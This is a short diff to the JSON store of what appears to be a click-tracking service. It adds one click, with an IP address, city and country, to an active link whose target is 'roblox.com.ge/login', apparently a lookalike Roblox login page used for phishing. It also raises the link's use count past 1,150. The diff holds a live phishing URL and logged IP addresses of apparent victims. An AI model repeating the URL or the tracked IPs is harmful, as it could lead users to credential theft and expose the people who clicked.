@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1153,
+    "useCount": 1154,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9368,6 +9368,14 @@
         "city": "Kuwait City",
         "flag": "🇰🇼",
         "countryCode": "KW"
+      },
+      {
+        "timestamp": 1777284191476,
+        "ip": "117.5.153.170",
+        "country": "Vietnam",
+        "city": "Hanoi",
+        "flag": "🇻🇳",
+        "countryCode": "VN"
       }
     ]
   },
